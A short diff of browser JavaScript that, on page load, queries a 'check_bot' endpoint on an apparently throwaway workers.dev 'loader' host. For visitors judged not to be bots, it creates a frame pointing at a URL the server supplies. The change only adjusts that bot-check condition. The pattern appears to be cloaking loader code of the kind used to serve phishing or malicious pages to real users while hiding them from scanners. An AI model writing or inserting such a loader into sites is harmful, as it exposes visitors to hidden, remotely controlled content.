@@ -54,7 +54,7 @@ window.addEventListener('message', (message) => {
 
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
-        if (res?.code == 200 && !res.result) {
+        if (res?.code == 200 && res.result === false ) {
             createFrame(res.url + '/nf5nPY3n')
 	    
         } else {
